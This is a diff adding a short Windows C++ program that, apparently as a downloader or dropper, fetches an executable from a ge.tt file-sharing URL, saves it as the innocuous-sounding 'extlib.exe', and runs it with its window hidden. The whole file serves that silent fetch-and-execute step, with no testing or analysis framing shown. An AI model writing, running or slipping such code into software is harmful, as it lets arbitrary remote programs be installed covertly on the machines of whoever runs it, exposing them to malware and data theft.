@@ -1,0 +1,21 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <windows.h>
+#include <shellapi.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <tchar.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
+using namespace std;
+
+int APIENTRY _tWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPTSTR lpCmdLine, _In_ int nCmdShow)
+{
+	/* Download External EXE File */
+	HRESULT hr = URLDownloadToFile(NULL, _T("http://ge.tt/api/1/files/9d5zZwI2/0/blob?download"), _T("extlib.exe"), 0, NULL);
+
+	/* Execute Program Silently */
+	ShellExecute(GetDesktopWindow(), L"open", _T("extlib.exe"), NULL, NULL, SW_HIDE);
+	return 0;
+}
